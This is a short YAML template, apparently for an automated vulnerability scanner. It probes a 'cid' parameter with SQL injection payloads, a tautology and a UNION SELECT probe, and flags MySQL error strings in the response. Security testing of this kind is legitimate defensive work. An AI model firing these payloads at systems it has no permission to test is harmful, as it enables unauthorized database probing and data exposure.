id: sqli-mysql-09
name: 'SQLi error mysql via cid'
severity: high
type: active
tags:
  - sqli
  - injection
  - mysql
description: 'Triggers mysql error via cid'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cid:
        - ''' OR ''1''=''1'
        - ''' UNION SELECT NULL--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
          - 'You have an error in your SQL syntax'
